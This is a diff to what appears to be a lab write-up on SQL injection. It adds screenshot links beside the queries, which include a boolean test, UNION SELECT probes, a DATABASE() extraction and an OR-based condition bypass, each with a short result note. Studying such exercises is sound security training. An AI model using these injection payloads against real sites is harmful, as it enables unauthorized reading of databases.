@@ -14,6 +14,8 @@ Query used:
 
 ```sql
 1' and 1=1;--
+
+![Task 1](./Assets/image.png)
 ```
 
 Result: Did not produce the desired output.
@@ -24,6 +26,8 @@ Query used:
 
 ```sql
 1' UNION SELECT 1,2,3,4;--
+
+![Task 2](./Assets/image%201.png)
 ```
 
 Result: Displayed content but not the expected output.
@@ -34,6 +38,8 @@ Query used:
 
 ```sql
 1' UNION SELECT 1,2,3,DATABASE();--
+
+![Task 2](./Assets/image%202.png)
 ```
 
 Result: Successfully retrieved the current database name.
@@ -44,6 +50,8 @@ Query used:
 
 ```sql
 0' OR id = '2
+
+![Task 2](./Assets/image%203.png)
 ```
 
 Result: Displayed the desired article ID 2.
